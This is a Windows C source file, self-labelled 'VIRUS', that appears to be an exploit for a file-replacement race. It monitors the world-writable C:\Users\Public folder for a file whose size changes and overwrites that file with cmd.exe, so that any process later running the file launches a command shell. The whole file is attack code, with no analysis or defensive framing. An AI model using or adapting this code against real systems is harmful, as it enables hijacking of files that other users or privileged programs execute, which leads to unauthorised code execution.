#include "stdafx.h"

#include <windows.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#pragma comment(lib, "User32.lib")


//#define DIR_NAME "C:\\Windows\\Temp"
#define DIR_NAME "C:\\Users\\Public"

#define VIRUS_PROGRAM "C:\\Windows\\System32\\cmd.exe"

void displayError(LPTSTR lpszFunction);
HANDLE openDirHandle(LPCTSTR dirName);
void getDirectoryChanges(HANDLE dirHandle, FILE_NOTIFY_INFORMATION * outputBuff);
void writeTofile(WCHAR * fileName, DWORD fileNameLen);
void copyfile(WCHAR * fileName, DWORD fileNameLen);



void main(int argc, TCHAR *argv[]) {
	_tprintf(TEXT("VIRUS\n"));

	LPCTSTR dirName = TEXT(DIR_NAME);
	FILE_NOTIFY_INFORMATION outputBuff[1024];
	HANDLE dirHandle = openDirHandle(dirName);
	
	if (dirHandle == INVALID_HANDLE_VALUE) {
		displayError(TEXT("Error Unable to open directory\n"));
		_tprintf(TEXT("Terminal failure: Unable to open dir \"%s\".\n"), dirName);
		return;
	}

	getDirectoryChanges(dirHandle, outputBuff);
	CloseHandle(dirHandle);
	copyfile(outputBuff[0].FileName, outputBuff[0].FileNameLength);
	return;
}


HANDLE openDirHandle(LPCTSTR dirName) {
	return CreateFile(dirName, 
					FILE_LIST_DIRECTORY,
					FILE_SHARE_READ,
					NULL,
					OPEN_EXISTING,          
					FILE_FLAG_BACKUP_SEMANTICS,
					NULL);
}

void getDirectoryChanges(HANDLE dirHandle, FILE_NOTIFY_INFORMATION * outputBuff) {
	DWORD dwBytesReturned = 0;
	if (ReadDirectoryChangesW(dirHandle, (LPVOID)outputBuff, 1024, false, FILE_NOTIFY_CHANGE_SIZE, &dwBytesReturned, NULL, NULL) == 0) {
		displayError(TEXT("Error Unable to open directory"));
		_tprintf(TEXT("Terminal failure: failed to retrieve directory changes.\n"));
		return;
	}
	return;
}


void copyfile(WCHAR * fileName, DWORD fileNameLen) {

	TCHAR fileFullPath[MAX_PATH];
	StringCchCopy(fileFullPath, MAX_PATH, TEXT(DIR_NAME));
	StringCchCat(fileFullPath, MAX_PATH, TEXT("\\"));
	StringCchCat(fileFullPath, sizeof(DIR_NAME)+ fileNameLen/2+1, fileName);
	_tprintf(TEXT("%s\n"), fileFullPath);
	
	bool success = CopyFile(TEXT(VIRUS_PROGRAM), fileFullPath,FALSE);
	if(!success)
		_tprintf(TEXT("Terminal failure: Counldn copy data to file\n"), fileFullPath);
}


void writeTofile(WCHAR * fileName, DWORD fileNameLen) {

	HANDLE hFile;
	char DataBuffer[] = "@echo off title This is your first batch script! echo Welcome to batch scripting!  pause";
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;
	TCHAR fileFullPath[MAX_PATH];

	StringCchCopy(fileFullPath, MAX_PATH, TEXT(DIR_NAME));
	StringCchCat(fileFullPath, MAX_PATH, TEXT("\\"));
	StringCchCat(fileFullPath, sizeof(DIR_NAME) + fileNameLen / 2 + 1, fileName);


	_tprintf(TEXT("%s\n"), fileFullPath);

	hFile = CreateFile(fileFullPath,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,                   // default security
		OPEN_ALWAYS,          // Opens a file only if it exists.
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		displayError(TEXT("Error Unable to open file"));
		_tprintf(TEXT("Terminal failure: Unable to open file \"%s\" for write.\n"), fileFullPath);
		return;
	}

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		DataBuffer,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	FlushFileBuffers(hFile);

	if (FALSE == bErrorFlag)
		printf("Terminal failure: Unable to write to file.\n");

	else if (dwBytesWritten != dwBytesToWrite)
		printf("Error: dwBytesWritten != dwBytesToWrite\n");

	else
		_tprintf(TEXT("Wrote %d bytes to %s successfully.\n"), dwBytesWritten, fileFullPath);


	CloseHandle(hFile);

}

void displayError(LPTSTR lpszFunction){
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0,
		NULL);

	lpDisplayBuf =
		(LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf)
			+ lstrlen((LPCTSTR)lpszFunction)
			+ 40) // account for format string
			* sizeof(TCHAR));

	if (FAILED(StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error code %d as follows:\n%s"),
		lpszFunction,
		dw,
		lpMsgBuf))){
		printf("FATAL ERROR: Unable to output error code.\n");
	}

	_tprintf(TEXT("ERROR: %s\n"), (LPCTSTR)lpDisplayBuf);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}

